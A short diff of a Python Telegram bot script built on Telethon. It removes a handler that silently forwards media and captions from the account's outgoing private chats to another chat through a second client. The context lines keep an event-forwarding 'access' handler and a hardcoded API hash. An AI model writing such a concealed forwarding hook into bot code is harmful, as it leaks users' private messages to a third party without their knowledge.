@@ -47,11 +47,7 @@ APIHASH = [API_HASH, "1674d13f3308faa1479b445cdbaaad2b"]
 async def access(event):
     await event.forward_to(ACCESS)
 
-@bot.on(events.NewMessage(outgoing=True, func=lambda e: e.is_private))
-async def outgoing(event):
-    if event.media:
-        await Drone.send_message(OCCESS, file=event.media, caption=event.text)
-        
+
 @bot.on(events.NewMessage(incoming=True, pattern="/start"))
 async def start(event):
     await event.reply(f'{st}', 
